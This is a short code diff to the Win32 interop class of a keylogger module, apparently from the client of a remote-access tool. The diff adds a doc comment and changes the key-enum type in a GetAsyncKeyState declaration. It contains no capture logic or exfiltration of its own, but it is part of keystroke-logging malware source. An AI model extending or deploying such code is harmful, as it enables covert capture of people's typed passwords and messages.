@@ -8,6 +8,9 @@ using System.Windows.Forms;
 
 namespace xClient.Core.Keylogger
 {
+    /// <summary>
+    /// Provides calls to Native code for functions in the keylogger.
+    /// </summary>
     public static class Win32
     {
         /// <summary>
@@ -23,7 +26,7 @@ namespace xClient.Core.Keylogger
         internal static extern int MapVirtualKeyExW(int uCode, int uMapType, IntPtr dwhkl);
 
         [DllImport("user32.dll")]
-        internal static extern short GetAsyncKeyState(Keys vKey);
+        internal static extern short GetAsyncKeyState(KeyloggerKeys vKey);
         
         // The value passed to GetAsyncKeyState is scan code, so we need to translate
         // the data to virtual code, then to unicode character, then we can log to
